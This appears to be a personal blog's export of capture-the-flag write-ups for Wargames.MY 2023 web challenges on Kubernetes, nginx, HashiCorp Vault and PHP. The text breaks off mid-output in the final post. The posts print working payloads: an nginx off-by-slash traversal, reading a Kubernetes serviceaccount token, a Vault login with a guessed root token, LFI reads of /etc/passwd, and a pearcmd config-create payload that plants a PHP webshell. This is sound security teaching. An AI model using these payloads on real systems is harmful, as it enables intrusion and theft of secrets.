[{"content":"","date":"17 December 2023","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"17 December 2023","permalink":"/","section":"d0ublew's Blog","summary":"","title":"d0ublew's Blog"},{"content":"","date":"17 December 2023","permalink":"/categories/k8s/","section":"Categories","summary":"","title":"k8s"},{"content":"Welcome to my average blog!\n","date":"17 December 2023","permalink":"/posts/","section":"My Average Blog","summary":"Welcome to my average blog!","title":"My Average Blog"},{"content":"","date":"17 December 2023","permalink":"/tags/nginx/","section":"Tags","summary":"","title":"nginx"},{"content":"","date":"17 December 2023","permalink":"/tags/off-by-slash/","section":"Tags","summary":"","title":"off-by-slash"},{"content":"","date":"17 December 2023","permalink":"/series/","section":"Series","summary":"","title":"Series"},{"content":" Disclaimer: this is my first time playing with k8s, so things that I mentioned may not be accurate. Enumeration # The challenge description links us to /api/status.php endpoint but there is nothing much in it. If we take look at the file content directly, we could see that it is using kubectl to get the status of the deployments.\n/var/www/api $ cat status.php \u0026lt;?php error_reporting(0); $ok = exec(\u0026#39;kubectl -n wgmy get deploy \u0026#39; . getenv(\u0026#39;DEPLOY\u0026#39;) . \u0026#39; -o jsonpath=\u0026#34;{.status.availableReplicas}\u0026#34;\u0026#39;); echo($ok ? \u0026#39;ok\u0026#39; : \u0026#39;not ok\u0026#39;); If we check the environment variables, we could see a bunch of stuff concerning with k8s (kubernetes).\n/var/www/api $ env KUBERNETES_PORT=tcp://10.43.0.1:443 KUBERNETES_SERVICE_PORT=443 USER=www-data HOSTNAME=wgmy-webtestonetwothree-backend-7bc587fcd8-p4ksj PHP_INI_DIR=/usr/local/etc/php WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP_ADDR=10.43.246.102 SHLVL=3 HOME=/home/www-data WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP_PORT=80 WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP_PROTO=tcp PHP_LDFLAGS=-Wl,-O1 -pie PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 PHP_VERSION=8.3.0 GPG_KEYS=1198C0117593497A5EC5C199286AF1F9897469DC C28D937575603EB4ABB725861C0779DC5C0A9DE4 AFD8691FDAEDF03BDF6E460563F15A9B715376CA PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 PHP_ASC_URL=https://www.php.net/distributions/php-8.3.0.tar.xz.asc PHP_URL=https://www.php.net/distributions/php-8.3.0.tar.xz WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP=tcp://10.43.246.102:80 WGMY_WEBTESTONETWOTHREE_BACKEND_SERVICE_PORT_FASTCGI=9000 KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin WGMY_WEBTESTONETWOTHREE_BACKEND_PORT_9000_TCP_ADDR=10.43.144.2 KUBERNETES_PORT_443_TCP_PORT=443 KUBERNETES_PORT_443_TCP_PROTO=tcp WGMY_WEBTESTONETWOTHREE_BACKEND_PORT_9000_TCP_PORT=9000 WGMY_WEBTESTONETWOTHREE_FRONTEND_SERVICE_PORT_HTTP=80 WGMY_WEBTESTONETWOTHREE_BACKEND_PORT_9000_TCP_PROTO=tcp DEPLOY=wgmy-webtestonetwothree-frontend WGMY_WEBTESTONETWOTHREE_BACKEND_SERVICE_HOST=10.43.144.2 KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443 KUBERNETES_SERVICE_PORT_HTTPS=443 WGMY_WEBTESTONETWOTHREE_FRONTEND_SERVICE_HOST=10.43.246.102 PHPIZE_DEPS=autoconf dpkg-dev dpkg file g++ gcc libc-dev make pkgconf re2c WGMY_WEBTESTONETWOTHREE_BACKEND_PORT_9000_TCP=tcp://10.43.144.2:9000 KUBERNETES_SERVICE_HOST=10.43.0.1 PWD=/var/www/api PHP_SHA256=1db84fec57125aa93638b51bb2b15103e12ac196e2f960f0d124275b2687ea54 WGMY_WEBTESTONETWOTHREE_BACKEND_PORT=tcp://10.43.144.2:9000 WGMY_WEBTESTONETWOTHREE_BACKEND_SERVICE_PORT=9000 WGMY_WEBTESTONETWOTHREE_FRONTEND_SERVICE_PORT=80 WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT=tcp://10.43.246.102:80 Seems like we are currently on the backend which serves the API endpoint while the initial page with password input box that we interact with is the frontend.\nThe next thing that we could do is to see what actions we could perform on the k8s cluster.\n/tmp $ kubectl auth can-i --list Resources Non-Resource URLs Resource Names Verbs selfsubjectreviews.authentication.k8s.io [] [] [create] selfsubjectaccessreviews.authorization.k8s.io [] [] [create] selfsubjectrulesreviews.authorization.k8s.io [] [] [create] [/.well-known/openid-configuration/] [] [get] [/.well-known/openid-configuration] [] [get] [/api/*] [] [get] [/api] [] [get] [/apis/*] [] [get] [/apis] [] [get] [/healthz] [] [get] [/healthz] [] [get] [/livez] [] [get] [/livez] [] [get] [/openapi/*] [] [get] [/openapi] [] [get] [/openid/v1/jwks/] [] [get] [/openid/v1/jwks] [] [get] [/readyz] [] [get] [/readyz] [] [get] [/version/] [] [get] [/version/] [] [get] [/version] [] [get] [/version] [] [get] configmaps [] [] [get] deployments.apps [] [wgmy-webtestonetwothree-frontend] [get] Most of the permissions are default like interacting with the k8s master API endpoints. The one that is useful for us is the last 2 lines.\nthe second last line means that we could get any configmaps data the last line means that we could only get deployments data named wgmy-webtestonetwothree-frontend Getting Deployments Data # To get the deployments data simply do kubectl get deployments \u0026lt;resource name\u0026gt;. Optionally we could also be more specific by specify the namespace (from /var/www/api/status.php) kubectl -n wgmy get deployments \u0026lt;resource name\u0026gt;.\n/tmp $ kubectl get deployments wgmy-webtestonetwothree-frontend NAME READY UP-TO-DATE AVAILABLE AGE wgmy-webtestonetwothree-frontend 2/2 2 2 35h /tmp $ kubectl get deploy wgmy-webtestonetwothree-frontend -o yaml apiVersion: apps/v1 kind: Deployment metadata: annotations: deployment.kubernetes.io/revision: \u0026#34;1\u0026#34; meta.helm.sh/release-name: wgmy-webtestonetwothree meta.helm.sh/release-namespace: wgmy creationTimestamp: \u0026#34;2023-12-15T14:14:18Z\u0026#34; generation: 2 labels: app.kubernetes.io/instance: wgmy-webtestonetwothree app.kubernetes.io/managed-by: Helm app.kubernetes.io/name: frontend app.kubernetes.io/version: 0.1.0 helm.sh/chart: frontend-0.1.0 name: wgmy-webtestonetwothree-frontend namespace: wgmy resourceVersion: \u0026#34;28477\u0026#34; uid: a8c63194-0eb2-4005-abe2-14138c2b615b spec: progressDeadlineSeconds: 600 replicas: 2 revisionHistoryLimit: 10 selector: matchLabels: app.kubernetes.io/instance: wgmy-webtestonetwothree app.kubernetes.io/name: frontend strategy: rollingUpdate: maxSurge: 25% maxUnavailable: 25% type: RollingUpdate template: metadata: annotations: vault.hashicorp.com/agent-inject: \u0026#34;true\u0026#34; vault.hashicorp.com/agent-inject-secret-flag: kv/data/flag_for_secret vault.hashicorp.com/role: wgmy creationTimestamp: null labels: app.kubernetes.io/instance: wgmy-webtestonetwothree app.kubernetes.io/name: frontend spec: containers: - image: nginx:1.25-alpine imagePullPolicy: IfNotPresent livenessProbe: failureThreshold: 3 httpGet: path: / port: http scheme: HTTP periodSeconds: 10 successThreshold: 1 timeoutSeconds: 1 name: frontend ports: - containerPort: 80 name: http protocol: TCP readinessProbe: failureThreshold: 3 httpGet: path: / port: http scheme: HTTP periodSeconds: 10 successThreshold: 1 timeoutSeconds: 1 resources: {} securityContext: {} terminationMessagePath: /dev/termination-log terminationMessagePolicy: File volumeMounts: - mountPath: /usr/share/nginx/html name: html - mountPath: /etc/nginx/conf.d name: conf - mountPath: /usr/share/nginx/.lemme_try_hiding_flag_with_dot_in_front name: flag dnsPolicy: ClusterFirst restartPolicy: Always schedulerName: default-scheduler securityContext: {} serviceAccount: wgmy-webtestonetwothree-frontend serviceAccountName: wgmy-webtestonetwothree-frontend terminationGracePeriodSeconds: 30 volumes: - configMap: defaultMode: 420 name: wgmy-webtestonetwothree-frontend-html name: html - configMap: defaultMode: 420 name: wgmy-webtestonetwothree-frontend-conf name: conf - name: flag secret: defaultMode: 420 items: - key: flag path: flag_for_status secretName: wgmy-webtestonetwothree-frontend-flag status: availableReplicas: 2 conditions: - lastTransitionTime: \u0026#34;2023-12-15T14:14:18Z\u0026#34; lastUpdateTime: \u0026#34;2023-12-15T14:14:20Z\u0026#34; message: ReplicaSet \u0026#34;wgmy-webtestonetwothree-frontend-556ccd7cf\u0026#34; has successfully progressed. reason: NewReplicaSetAvailable status: \u0026#34;True\u0026#34; type: Progressing - lastTransitionTime: \u0026#34;2023-12-16T14:43:01Z\u0026#34; lastUpdateTime: \u0026#34;2023-12-16T14:43:01Z\u0026#34; message: Deployment has minimum availability. reason: MinimumReplicasAvailable status: \u0026#34;True\u0026#34; type: Available observedGeneration: 2 readyReplicas: 2 replicas: 2 updatedReplicas: 2 We could see that there are interesting strings like:\n.lemme_try_hiding_flag_with_dot_in_front wgmy-webtestonetwothree-frontend-flag flag_for_status kv/data/flag_for_secret (for the other challenge named secret) Alternative way to retrieve this data without kubectl is through the API endpoint directly, see appendix\nRetrieving nginx Config from configmaps # Notice the following snippet:\n[...] volumeMounts: - mountPath: /usr/share/nginx/html name: html - mountPath: /etc/nginx/conf.d name: conf - mountPath: /usr/share/nginx/.lemme_try_hiding_flag_with_dot_in_front name: flag [...] volumes: - configMap: defaultMode: 420 name: wgmy-webtestonetwothree-frontend-html name: html - configMap: defaultMode: 420 name: wgmy-webtestonetwothree-frontend-conf name: conf - name: flag secret: defaultMode: 420 items: - key: flag path: flag_for_status secretName: wgmy-webtestonetwothree-frontend-flag [...] I assume that the name under volumeMounts refers to the name under volumes. Hence, the nginx config can be retrieved from wgmy-webtestonetwothree-frontend-conf\n/tmp $ kubectl get configmaps wgmy-webtestonetwothree-frontend-conf -o yaml apiVersion: v1 data: default.conf: | set_real_ip_from 10.42.0.0/16; real_ip_header X-Real-IP; # from traefik server { listen 80; server_name _; location / { root /usr/share/nginx/html; index index.html; } location /static { alias /usr/share/nginx/html/; add_header Cache-Control \u0026#34;private, max-age=3600\u0026#34;; } location /api/ { include /etc/nginx/fastcgi_params; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www$fastcgi_script_name; fastcgi_pass wgmy-webtestonetwothree-backend:9000; } location /internal-secret/ { allow 10.42.0.0/16; deny all; proxy_pass http://vault.vault:8200/; } } kind: ConfigMap metadata: annotations: meta.helm.sh/release-name: wgmy-webtestonetwothree meta.helm.sh/release-namespace: wgmy creationTimestamp: \u0026#34;2023-12-15T14:14:18Z\u0026#34; labels: app.kubernetes.io/instance: wgmy-webtestonetwothree app.kubernetes.io/managed-by: Helm app.kubernetes.io/name: frontend app.kubernetes.io/version: 0.1.0 helm.sh/chart: frontend-0.1.0 name: wgmy-webtestonetwothree-frontend-conf namespace: wgmy resourceVersion: \u0026#34;1726\u0026#34; uid: 5a73676b-f509-44b0-8e2d-e921eb4cf7b4 set_real_ip_from 10.42.0.0/16; real_ip_header X-Real-IP; # from traefik server { listen 80; server_name _; location / { root /usr/share/nginx/html; index index.html; } location /static { alias /usr/share/nginx/html/; add_header Cache-Control \u0026#34;private, max-age=3600\u0026#34;; } location /api/ { include /etc/nginx/fastcgi_params; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www$fastcgi_script_name; fastcgi_pass wgmy-webtestonetwothree-backend:9000; } location /internal-secret/ { allow 10.42.0.0/16; deny all; proxy_pass http://vault.vault:8200/; } } We could see that there is off-by-slash on /static which allows us to read the .lemme_try_hiding_flag_with_dot_in_front/flag_for_status file by accessing /static../.lemme_try_hiding_flag_with_dot_in_front/flag_for_status\n/tmp $ env | grep FRONTEND WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP_ADDR=10.43.246.102 WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP_PORT=80 WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP_PROTO=tcp WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP=tcp://10.43.246.102:80 WGMY_WEBTESTONETWOTHREE_FRONTEND_SERVICE_PORT_HTTP=80 WGMY_WEBTESTONETWOTHREE_FRONTEND_SERVICE_HOST=10.43.246.102 WGMY_WEBTESTONETWOTHREE_FRONTEND_SERVICE_PORT=80 WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT=tcp://10.43.246.102:80 /tmp $ nslookup 10.43.246.102 Server: 10.43.0.10 Address: 10.43.0.10:53 102.246.43.10.in-addr.arpa name = wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local /tmp $ curl -s -L http://wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local/static../.lemme_try_hiding_flag_with_dot_in_front/flag_for_status wgmy{21c47f8225240bd1b87e9060986ddb4f}/tmp $ /tmp $ curl -s -L http://10.43.246.102/static../.lemme_try_hiding_flag_with_dot_in_front/flag_for_status wgmy{21c47f8225240bd1b87e9060986ddb4f} flag: wgmy{21c47f8225240bd1b87e9060986ddb4f}\nNext, we would look at the other nginx endpoint, i.e., /internal-secret to get the other flag.\nReferences # https://kubernetes.io/docs/reference/using-api/api-concepts/#resource-uris https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf#page=19 Appendix # Getting k8s serviceaccount Token # To interact with the API, we need to get the serviceaccount token.\n/tmp $ cat /var/run/secrets/kubernetes.io/serviceaccount/token eyJhbGciOiJSUzI1NiIsImtpZCI6Im5oUXBoT0FLNVY5U2llMDR2ZFpfeDByYlpCVEtRQlVDUlB[...] /tmp $ cat /var/run/secrets/kubernetes.io/serviceaccount/token \u0026gt; token Getting Other Services IP and Domain Name # Next, we can use the token in the HTTP header Authorization: Bearer \u0026lt;token\u0026gt; and use curl on the k8s master ip which can be retrieved from the environment variable or use the domain name by reverse nslookup the IP or follow the naming convention\n/tmp $ env | grep ^KUBERNETES KUBERNETES_PORT=tcp://10.43.0.1:443 KUBERNETES_SERVICE_PORT=443 KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1 KUBERNETES_PORT_443_TCP_PORT=443 KUBERNETES_PORT_443_TCP_PROTO=tcp KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443 KUBERNETES_SERVICE_PORT_HTTPS=443 KUBERNETES_SERVICE_HOST=10.43.0.1 Example of converting the domain name manually:\nFOO_BAR_SERVICE replace `_` with `-` until the word `_SERVICE` and append `.\u0026lt;namespace\u0026gt;.svc.cluster.local` if namespace is default -\u0026gt; foo-bar.default.svc.cluster.local if namespace is wgmy -\u0026gt; foo-bar.wgmy.svc.cluster.local WGMY_WEBTESTONETWOTHREE_FRONTEND_SERVICE -\u0026gt; wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local Refer to this documentation on how to determine the API endpoint. Furthermore, you can browse /apis and use the name field to build the next part after /apis\n/tmp $ curl -s -k -H \u0026#34;Authorization: Bearer $(cat token)\u0026#34; https://kubernetes.default.svc.cluster.local/apis/ | grep name \u0026#34;name\u0026#34;: \u0026#34;apiregistration.k8s.io\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;apps\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;events.k8s.io\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;authentication.k8s.io\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;authorization.k8s.io\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;autoscaling\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;batch\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;certificates.k8s.io\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;networking.k8s.io\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;policy\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;rbac.authorization.k8s.io\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;storage.k8s.io\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;admissionregistration.k8s.io\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;apiextensions.k8s.io\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;scheduling.k8s.io\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;coordination.k8s.io\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;node.k8s.io\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;discovery.k8s.io\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;flowcontrol.apiserver.k8s.io\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;helm.cattle.io\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;k3s.cattle.io\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;traefik.containo.us\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;traefik.io\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;metrics.k8s.io\u0026#34;, Getting stuff via API # Disclaimer: the first attempt that I did was just trial-and-error before noticing the pattern (which could be wrong as well) I use /apis/apps from the assumption of kubectl auth can-i --list output: deployments.apps\n/tmp $ curl -s -k -H \u0026#34;Authorization: Bearer $(cat token)\u0026#34; https://kubernetes.default.svc.cluster.local/apis/apps/v1/namespaces/wgmy/deployments/wgmy-webtestonetwothree-frontend I use /api directly based on the assumption that since the kubectl auth can-i --list output is only: configmaps\n/tmp $ curl -s -k -H \u0026#34;Authorization: Bearer $(cat token)\u0026#34; https://kubernetes.default.svc.cluster.local/api/v1/namespaces/wgmy/configmaps/wgmy-webtestonetwothree-frontend-conf ","date":"17 December 2023","permalink":"/posts/wgmy2023/web/status/","section":"My Average Blog","summary":"Retrieve nginx config file from k8s configmaps","title":"Status"},{"content":"","date":"17 December 2023","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"17 December 2023","permalink":"/series/wargames.my-2023-web-k8s/","section":"Series","summary":"","title":"Wargames.MY 2023 web k8s"},{"content":"","date":"17 December 2023","permalink":"/categories/web/","section":"Categories","summary":"","title":"web"},{"content":"","date":"17 December 2023","permalink":"/categories/wgmy2023/","section":"Categories","summary":"","title":"wgmy2023"},{"content":"","date":"17 December 2023","permalink":"/tags/hashicorp-vault/","section":"Tags","summary":"","title":"hashicorp vault"},{"content":"","date":"17 December 2023","permalink":"/tags/k8s/","section":"Tags","summary":"","title":"k8s"},{"content":"","date":"17 December 2023","permalink":"/tags/lfi/","section":"Tags","summary":"","title":"LFI"},{"content":"","date":"17 December 2023","permalink":"/tags/php/","section":"Tags","summary":"","title":"php"},{"content":"","date":"17 December 2023","permalink":"/tags/rce/","section":"Tags","summary":"","title":"RCE"},{"content":"Initial Analysis # From the nginx config that we retrieved previously, we could see that /internal-secret is only accessible from 10.42.0.0/16 which happens to be the internal network of the k8s cluster.\nset_real_ip_from 10.42.0.0/16; real_ip_header X-Real-IP; # from traefik server { listen 80; server_name _; location / { root /usr/share/nginx/html; index index.html; } location /static { alias /usr/share/nginx/html/; add_header Cache-Control \u0026#34;private, max-age=3600\u0026#34;; } location /api/ { include /etc/nginx/fastcgi_params; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www$fastcgi_script_name; fastcgi_pass wgmy-webtestonetwothree-backend:9000; } location /internal-secret/ { allow 10.42.0.0/16; deny all; proxy_pass http://vault.vault:8200/; } } Accessing /internal-secret/ # If we try to do access it via the frontend IP address from the backend pod, we could see that it tries to redirect to /ui/ but in the return 404 Not Found\n/tmp $ curl -s -v http://wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local/internal-secret/ * Host wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local:80 was resolved. * IPv6: (none) * IPv4: 10.43.246.102 * Trying 10.43.246.102:80... * Connected to wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local (10.43.246.102) port 80 \u0026gt; GET /internal-secret/ HTTP/1.1 \u0026gt; Host: wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local \u0026gt; User-Agent: curl/8.5.0 \u0026gt; Accept: */* \u0026gt; \u0026lt; HTTP/1.1 307 Temporary Redirect \u0026lt; Server: nginx/1.25.3 \u0026lt; Date: Sun, 17 Dec 2023 02:53:35 GMT \u0026lt; Content-Type: text/html; charset=utf-8 \u0026lt; Content-Length: 40 \u0026lt; Connection: keep-alive \u0026lt; Cache-Control: no-store \u0026lt; Location: /ui/ \u0026lt; Strict-Transport-Security: max-age=31536000; includeSubDomains \u0026lt; { [40 bytes data] \u0026lt;a href=\u0026#34;/ui/\u0026#34;\u0026gt;Temporary Redirect\u0026lt;/a\u0026gt;. * Connection #0 to host wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local left intact /tmp $ curl -s -v -L http://wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local/internal-secret/ * Host wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local:80 was resolved. * IPv6: (none) * IPv4: 10.43.246.102 * Trying 10.43.246.102:80... * Connected to wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local (10.43.246.102) port 80 \u0026gt; GET /internal-secret/ HTTP/1.1 \u0026gt; Host: wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local \u0026gt; User-Agent: curl/8.5.0 \u0026gt; Accept: */* \u0026gt; \u0026lt; HTTP/1.1 307 Temporary Redirect \u0026lt; Server: nginx/1.25.3 \u0026lt; Date: Sun, 17 Dec 2023 02:53:40 GMT \u0026lt; Content-Type: text/html; charset=utf-8 \u0026lt; Content-Length: 40 \u0026lt; Connection: keep-alive \u0026lt; Cache-Control: no-store \u0026lt; Location: /ui/ \u0026lt; Strict-Transport-Security: max-age=31536000; includeSubDomains \u0026lt; * Ignoring the response-body * Connection #0 to host wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local left intact * Issue another request to this URL: \u0026#39;http://wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local/ui/\u0026#39; * Found bundle for host: 0x7fb7009e00e0 [serially] * Can not multiplex, even if we wanted to * Re-using existing connection with host wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local \u0026gt; GET /ui/ HTTP/1.1 \u0026gt; Host: wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local \u0026gt; User-Agent: curl/8.5.0 \u0026gt; Accept: */* \u0026gt; \u0026lt; HTTP/1.1 404 Not Found \u0026lt; Server: nginx/1.25.3 \u0026lt; Date: Sun, 17 Dec 2023 02:53:40 GMT \u0026lt; Content-Type: text/html \u0026lt; Content-Length: 153 \u0026lt; Connection: keep-alive \u0026lt; { [153 bytes data] \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;404 Not Found\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.25.3\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; * Connection #0 to host wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local left intact If we instead directly access http://vault.vault:8200, we could see some result. However, there is nothing much interesting from the return page. Recall from previous deployments data, we could see there is vault.hashicorp.com which hints me to research more about hashicorp vault kubernetes on google. Link to findings can be found here\nInteracting with the Vault # The next thing to do is to download the vault CLI standalone binary to the k8s pod.\n/tmp $ wget https://releases.hashicorp.com/vault/1.15.4/vault_1.15.4_linux_amd64.zip Connecting to releases.hashicorp.com (18.155.68.21:443) saving to \u0026#39;vault_1.15.4_linux_amd64.zip\u0026#39; vault_1.15.4_linux_a 0% | | 54115 0:41:24 ETA vault_1.15.4_linux_a 100% |********************************| 128M 0:00:00 ETA \u0026#39;vault_1.15.4_linux_amd64.zip\u0026#39; saved /tmp $ unzip *.zip Archive: vault_1.15.4_linux_amd64.zip inflating: vault /tmp $ chmod +x vault /tmp $ ./vault --version Vault v1.15.4 (9b61934559ba31150860e618cf18e816cbddc630), built 2023-12-04T17:45:28Z Next, we set the environment variable VAULT_ADDR and authenticate. I actually got lucky on trying to login with root as the argument.\n/tmp $ export VAULT_ADDR=http://vault.vault:8200 /tmp $ ./vault login root Success! You are now authenticated. The token information displayed below is already stored in the token helper. You do NOT need to run \u0026#34;vault login\u0026#34; again. Future Vault requests will automatically use this token. Key Value --- ----- token root token_accessor aPpqqqicK0QC4ZW9t1hZ244c token_duration ‚àû token_renewable false token_policies [\u0026#34;root\u0026#34;] identity_policies [] policies [\u0026#34;root\u0026#34;] /tmp $ ./vault read kv/data/flag_for_secret Key Value --- ----- data map[flag_for_secret:wgmy{352ce22be3caed452e616b655db7cb20}] metadata map[created_time:2023-12-15T13:42:49.553430131Z custom_metadata:\u0026lt;nil\u0026gt; deletion_time: destroyed:false version:1] flag: wgmy{352ce22be3caed452e616b655db7cb20}\nReferences # https://www.digitalocean.com/community/tutorials/how-to-securely-manage-secrets-with-hashicorp-vault-on-ubuntu-20-04 https://developer.hashicorp.com/vault/tutorials/kubernetes/kubernetes-sidecar https://developer.hashicorp.com/vault/install#Linux https://developer.hashicorp.com/vault/tutorials/getting-started/getting-started-authentication ","date":"17 December 2023","permalink":"/posts/wgmy2023/web/secret/","section":"My Average Blog","summary":"Read secret from HashiCorp vault","title":"Secret"},{"content":"Initial Analysis # We are presented with an input box that asks for a password.\nThe password checker is done on the client side via a minified javascript called script.min.js.\nWe can then deobfuscate the script with https://deobfuscate.io/ which manage to detect the matching obfuscator and redirects us to https://obf-io.deobfuscate.io/.\nPassing The Password Checker # Looking at the deobfuscated script, we can see that the password is this_password_is_so_weak_i_can_crack_in_1_sec! and if we give this password, it would reach out to /api/4aa22934982f984b8a0438b701e8dec8.php endpoint and hopefully give us the flag.\n/* ... */ document.querySelector(\u0026#39;button\u0026#39;).addEventListener(\u0026#34;click\u0026#34;, _0x3ac921 =\u0026gt; { _0x3ac921.preventDefault(); if (document.querySelector(\u0026#34;input\u0026#34;).value === \u0026#34;this_password_is_so_weak_i_can_crack_in_1_sec!\u0026#34;) { fetch(\u0026#34;/api/4aa22934982f984b8a0438b701e8dec8.php?x=flag_for_warmup.php\u0026#34;).then(_0x5c12f5 =\u0026gt; _0x5c12f5.text()).then(_0x509e6e =\u0026gt; Swal.fire({ \u0026#39;title\u0026#39;: \u0026#34;Good job!\u0026#34;, \u0026#39;html\u0026#39;: _0x509e6e, \u0026#39;icon\u0026#39;: \u0026#34;success\u0026#34; })); } else { Swal.fire({ \u0026#39;title\u0026#39;: \u0026#34;Oops...\u0026#34;, \u0026#39;text\u0026#39;: \u0026#34;wrong password\u0026#34;, \u0026#39;icon\u0026#39;: \u0026#34;error\u0026#34; }); } }); Unfortunately, there is no flag, but it mentioned about comment.\nIf we try to use curl to visit the endpoint, we could see there is an HTML comment, but it is still not it.\n$ curl -s http://warmup.wargames.my/api/4aa22934982f984b8a0438b701e8dec8.php?x=flag_for_warmup.php here\u0026#39;s your flag \u0026lt;small\u0026gt;in comment\u0026lt;/small\u0026gt; \u0026lt;!-- well, maybe not this comment --\u0026gt; LFI # Notice that the API endpoint accepts a filename for the parameter query x. This almost screams LFI (local file inclusion) to me.\nWe can try to pass in /etc/passwd and we indeed get the file content\n$ curl -s http://warmup.wargames.my/api/4aa22934982f984b8a0438b701e8dec8.php?x=/etc/passwd root‚ùå0:0:root:/root:/bin/ash bin‚ùå1:1:bin:/bin:/sbin/nologin daemon‚ùå2:2:daemon:/sbin:/sbin/nologin [...] guest‚ùå405üíØguest:/dev/null:/sbin/nologin nobody‚ùå65534:65534:nobody:/:/sbin/nologin www-data‚ùå82:82:Linux User,,,:/home/www-data:/sbin/nologin There are lots of filter implemented to deny us from accessing stuff like procfs and wrappers such as php://input, php://filter/convert, data://, etc.\nI was not able to bypass it but other participants managed to do it by:\ndouble URL encoding (@Shen) using zlib filter LFI2RCE # In the end, I stumbled upon this cheat sheet which allows us to get RCE with PHP PEARCMD which most probably satisfy the prerequisite as most CTF challenges uses php image from docker registry.\nThis is the payload that I used:\n?+config-create+/\u0026amp;x=/usr/local/lib/php/pearcmd.php\u0026amp;/\u0026lt;?=system($_GET[\u0026#39;c\u0026#39;])?\u0026gt;+/tmp/pir.php Next, we can use the uploaded webshell to execute arbitrary command\n$ curl -s \u0026#39;http://warmup.wargames.my/api/4aa22934982f984b8a0438b701e8dec8.php?x=/tmp/pir.php\u0026amp;c=id\u0026#39; #PEAR_Config 0.9 a:12:{s:7:\u0026#34;php_dir\u0026#34;;s:68:\u0026#34;/\u0026amp;x=/usr/local/lib/php/pearcmd.php\u0026amp;/uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data) uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)/pear/php\u0026#34;;s:8:\u0026#34;data_dir\u0026#34;;s:69:\u0026#34;/\u0026amp;x=/usr/local/lib/php/pearcmd.php\u0026amp;/uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data) uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)/pear/data\u0026#34;;s:7:\u0026#34;www_dir\u0026#34;;s:68:\u0026#34;/\u0026amp;x=/usr/local/lib/php/pearcmd.php\u0026amp;/uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data) uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)/pear/www\u0026#34;;s:7:\u0026#34;cfg_dir\u0026#34;;s:68:\u0026#34;/\u0026amp;x=/usr/local/lib/php/pearcmd.php\u0026amp;/uid=82(www-data) 